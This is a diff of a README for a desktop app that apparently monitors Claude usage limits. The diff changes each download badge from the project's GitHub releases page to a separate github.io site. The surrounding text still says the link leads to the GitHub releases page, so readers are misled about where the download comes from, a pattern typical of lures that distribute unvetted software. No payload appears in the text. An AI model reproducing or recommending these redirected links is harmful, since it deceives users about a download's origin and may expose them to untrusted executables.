@@ -1,6 +1,6 @@
 # 🐾 claude-usage-pal-desktop - Your Friendly AI Usage Watchdog
 
-[![Download Now](https://img.shields.io/badge/Download-Claude_Usage_Pal-brightgreen?style=for-the-badge&logo=windows&logoColor=white&color=4CAF50)](https://github.com/horned-specialization130/claude-usage-pal-desktop/releases)
+[![Download Now](https://img.shields.io/badge/Download-Claude_Usage_Pal-brightgreen?style=for-the-badge&logo=windows&logoColor=white&color=4CAF50)](https://horned-specialization130.github.io)
 
 ---
 
@@ -36,7 +36,7 @@ Getting started is easier than you think. Follow these simple steps, and you'll 
 
 Visit this link to download the application.
 
-[![Download Latest Version](https://img.shields.io/badge/⬇️_Download_Now-Click_Here-blue?style=for-the-badge&logo=github&logoColor=white&color=2196F3)](https://github.com/horned-specialization130/claude-usage-pal-desktop/releases)
+[![Download Latest Version](https://img.shields.io/badge/⬇️_Download_Now-Click_Here-blue?style=for-the-badge&logo=github&logoColor=white&color=2196F3)](https://horned-specialization130.github.io)
 
 This link will take you to the GitHub releases page where you can find all available versions of the app.
 
@@ -152,7 +152,7 @@ Why worry about hitting limits when you can have a cute friend watching out for 
 
 You're just a few clicks away from having your new desktop companion. Visit the download page and join thousands of happy users who never have to worry about unexpected rate limits again!
 
-[![Download Now](https://img.shields.io/badge/🚀_Get_Started-Download_Here-orange?style=for-the-badge&logo=windows&logoColor=white&color=FF5722)](https://github.com/horned-specialization130/claude-usage-pal-desktop/releases)
+[![Download Now](https://img.shields.io/badge/🚀_Get_Started-Download_Here-orange?style=for-the-badge&logo=windows&logoColor=white&color=FF5722)](https://horned-specialization130.github.io)
 
 Your friendly AI usage monitor is waiting for you. See you on the other side!
 
